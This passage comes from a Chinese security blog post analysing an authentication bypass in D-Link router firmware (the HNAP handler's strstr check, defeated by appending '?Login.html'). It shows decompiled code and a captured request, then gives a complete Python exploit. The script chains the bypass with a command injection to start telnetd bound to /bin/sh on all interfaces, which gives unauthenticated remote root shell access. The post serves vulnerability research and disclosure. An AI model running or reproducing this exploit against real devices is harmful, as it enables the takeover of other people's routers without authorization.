</span><br><span class="line">  <span class="built_in">memset</span>(acStack2092,<span class="number">0</span>,<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack1068,<span class="number">0</span>,<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(auStack44,<span class="string">&quot;&lt;title&gt;401 Not Authorized&lt;/title&gt;\r\n&quot;</span>,<span class="number">0x24</span>);</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(param_1 + <span class="number">0xe4</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    uri_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (uri_index &lt; <span class="number">0xb</span>) &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(acStack2092,<span class="number">0x400</span>,<span class="string">&quot;%s%s&quot;</span>,<span class="string">&quot;http://purenetworks.com/HNAP1/&quot;</span>,</span><br><span class="line">               s_GetCAPTCHAsetting_004d01a0 + uri_index * <span class="number">0x20</span>);</span><br><span class="line">      <span class="built_in">snprintf</span>(acStack1068,<span class="number">0x400</span>,<span class="string">&quot;\&quot;%s%s\&quot;&quot;</span>,<span class="string">&quot;http://purenetworks.com/HNAP1/&quot;</span>,</span><br><span class="line">               s_GetCAPTCHAsetting_004d01a0 + uri_index * <span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> ((*(<span class="type">int</span> *)(param_1 + <span class="number">0xe4</span>) == <span class="number">0</span>) ||</span><br><span class="line">         (pcVar2 = <span class="built_in">strstr</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xe4</span>),s_GetCAPTCHAsetting_004d01a0 + uri_index *<span class="number">0x20</span></span><br><span class="line">                         ), pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*(<span class="type">int</span> *)(param_1 + <span class="number">0xd4</span>) != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">           ((iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xd4</span>),acStack2092), iVar1 == <span class="number">0</span> ||</span><br><span class="line">            (iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xd4</span>),acStack1068), iVar1 == <span class="number">0</span>)))) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        iVar1 = <span class="built_in">strcmp</span>(s_GetCAPTCHAsetting_004d01a0 + uri_index * <span class="number">0x20</span>,<span class="string">&quot;/HNAP1/&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (((iVar1 != <span class="number">0</span>) || (*(<span class="type">int</span> *)(param_1 + <span class="number">200</span>) == <span class="number">0</span>)) ||</span><br><span class="line">           (iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">200</span>),<span class="string">&quot;POST&quot;</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      uri_index = uri_index + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((*(<span class="type">int</span> *)(param_1 + <span class="number">0x110</span>) == <span class="number">0</span>) ||</span><br><span class="line">     ((iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0x110</span>),<span class="string">&quot;QRSMobile&quot;</span>,<span class="number">9</span>), iVar1 != <span class="number">0</span> &amp;&amp;</span><br><span class="line">      ((pcVar2 = <span class="built_in">strstr</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0x110</span>),<span class="string">&quot;Android&quot;</span>), pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span> ||</span><br><span class="line">       (iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0x110</span>),<span class="string">&quot;Mozilla&quot;</span>,<span class="number">7</span>), iVar1 == <span class="number">0</span>)))))) &#123;</span><br><span class="line">    iVar1 = FUN_0042159c(param_1);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">       ((*(<span class="type">int</span> *)(param_1 + <span class="number">200</span>) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">200</span>),<span class="string">&quot;POST&quot;</span>), iVar1 == <span class="number">0</span>)))) &#123;</span><br><span class="line">      FUN_00424498(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      websDefaultHandler(param_1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;/Index.html&quot;</span>,<span class="string">&quot;/Index.html&quot;</span>,*(undefined4 *)(param_1 +<span class="number">0xf8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    websRspNotAuth(param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这个函数接收的参数是 webs_t 结构体，用于代表一个 web 请求。可以通过不断的交叉引用找到源函数 websSecurityHandler，gohead 中同名函数描述如下：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">websSecurityHandler implements the default security policy. It operates as a URL handler and is installed to run as the very first URL handler. If you require a replacement security policy, delete the websSecurityHandler and install your own with websUrlHandlerDefine.</span><br></pre></td></tr></table></figure></div><p>简单分析上面提到的函数逻辑，发现他会取出 webs_t 中下标为 0xe4 的数据并判断字符串列表中的数据是否出现在其中。通过分析 main 函数可以确定，0xe4 位置存放的是 Request_URI 指针，表示用户访问的 URL 链接。</p><p>如果字符串列表中的数据出现在 Request_URI 中，则允许访问。进一步分析发现这些硬编码的接口默认都是不需要身份验证就能访问的。例如 Login.html 是登录接口，EULA.html 是用户隐私协议等。</p><p>此函数的问题在于，它使用了 strstr 函数对用户输入的数据进行判断，如果用户访问一个本来需要身份验证的链接，然后在链接的后面添加这些字符串即可绕过身份验证逻辑。</p><p>漏洞测试：</p><p>首先抓包获取一个需要身份验证的 HTTP 请求：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /HNAP1/ HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">Content-Length: 302</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">HNAP_AUTH: 00DAB25BFD3EBF8FAD03E60E5616BF44 1598580346156</span><br><span class="line">SOAPAction: &quot;http://purenetworks.com/HNAP1/GetIPv6Status&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Content-Type: text/xml; charset=UTF-8</span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line">Referer: http://192.168.0.1/Home.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: uid=uFXfaJBA</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;GetIPv6Status xmlns=&quot;http://purenetworks.com/HNAP1/&quot; /&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div><p>这个请求发送到路由器可以返回正常的结果。然后构造一个非法的请求，在访问链接中添加 ‘?Login.html’：</p><p><img lazyload src="/images/loading.svg" data-src="/img/aubypass-2.png"></p><p>可以看到构造的恶意 payload 能够绕过身份验证直接访问敏感接口。</p><p>此外我们可以结合这个身份验证漏洞以及<a href="https://wzt.ac.cn/2019/09/18/D-Link_BUG/">命令注入漏洞</a>实现无条件的 RCE。</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">telnet_payload = <span class="string">r&quot;1.com/&amp;amp;$(telnetd$IFS$9-l$IFS$9/bin/sh$IFS$9-b$IFS$9&#x27;0.0.0.0&#x27;)&amp;amp;&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;uid&quot;</span>: <span class="string">&quot;CataLpa&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/xml&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;SOAPACTION&quot;</span>: <span class="string">&quot;\&quot;http://purenetworks.com/HNAP1/SetWebFilterSettings\&quot;&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">burp0_data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;soap:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot; xmlns:soap=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&gt;\n&lt;soap:Body&gt;\n&lt;SetWebFilterSettings&gt;\n\t&lt;WebFilterMethod&gt;DENY&lt;/WebFilterMethod&gt;\n\t&lt;NumberOfEntry&gt;1&lt;/NumberOfEntry&gt;\n\t&lt;WebFilterURLs&gt;\n\t\t&lt;string&gt;&quot;</span> + telnet_payload + <span class="string">&quot;&lt;/string&gt;\n\t&lt;/WebFilterURLs&gt;\n&lt;/SetWebFilterSettings&gt;\n&lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Usage: python DIR-878.py &lt;ip&gt;&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    IP = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Send payload to &quot;</span> + IP)</span><br><span class="line">    burp0_url = <span class="string">&quot;http://&quot;</span> + IP + <span class="string">&quot;:80/HNAP1/?Login.html&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;200&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res.status_code):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Exploit success!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] telnet &quot;</span> + IP)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Exploit failed. Bug fixed :(&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Exploit failed.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure></div></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>Title:</strong> IoT 设备中身份验证绕过的一些漏洞(1)</li><li><strong>Author:</strong> Catalpa</li><li><strong>Created at :</strong> 2020-08-28 00:00:00</li><li><strong>Updated at :</strong> 2024-10-17 08:23:50</li><li><strong>Link:</strong> https://wzt.ac.cn/2020/08/28/bypass_auth/</li><li><strong>License: </strong>This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-sa/4.0">CC BY-SA 4.0</a>.</li></ul></div></div><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="prev" rel="prev" href="/2020/11/10/cisco-rv110w-bugs/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item">Cisco RV110W 数个漏洞</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/2020/05/23/IPC43AN/"><span class="title flex justify-center items-center"><span class="post-nav-title-item">TP-Link IP43AN</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">On this page</div><div class="page-title">IoT 设备中身份验证绕过的一些漏洞(1)</div><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2020-8864"><span class="nav-text">CVE-2020-8864</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">漏洞基本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2020-8861"><span class="nav-text">CVE-2020-8861</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-1"><span class="nav-text">漏洞基本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2020-8862"><span class="nav-text">CVE-2020-8862</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2020-15633"><span class="nav-text">CVE-2020-15633</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-2"><span class="nav-text">漏洞基本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="nav-text">漏洞分析</span></a></li></ol></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2018</span> - 2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">Catalpa</a><p class="post-count space-x-0.5"><span>68 posts in total </span><span>258.4k words in total</span></p></div><script data-swup-reload-script src="https://cn.vercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">VISITOR COUNT</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">TOTAL PAGE VIEWS</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span> <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span></div><div>Blog up for <span class="odometer" id="runtime_days"></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fa-solid fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa-solid fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="/js/build/libs/Swup.min.js"></script><script src="/js/build/libs/SwupSlideTheme.min.js"></script><script src="/js/build/libs/SwupScriptsPlugin.min.js"></script><script src="/js/build/libs/SwupProgressPlugin.min.js"></script><script src="/js/build/libs/SwupScrollPlugin.min.js"></script><script src="/js/build/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script src="/js/build/tools/imageViewer.js" type="module"></script><script src="/js/build/utils.js" type="module"></script><script src="/js/build/main.js" type="module"></script><script src="/js/build/layouts/navbarShrink.js" type="module"></script><script src="/js/build/tools/scrollTopBottom.js" type="module"></script><script src="/js/build/tools/lightDarkSwitch.js" type="module"></script><script src="/js/build/layouts/categoryList.js" type="module"></script><script src="/js/build/tools/localSearch.js" type="module"></script><script src="/js/build/tools/codeBlock.js" type="module"></script><script src="/js/build/layouts/lazyload.js" type="module"></script><script src="/js/build/tools/runtime.js"></script><script src="/js/build/libs/odometer.min.js"></script><link rel="stylesheet" href="/assets/odometer-theme-minimal.css"><script src="/js/build/libs/Typed.min.js"></script><script src="/js/build/plugins/typed.js" type="module"></script><script src="/js/build/libs/anime.min.js"></script><script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script><script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script><script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script><script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script><script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script></body></html>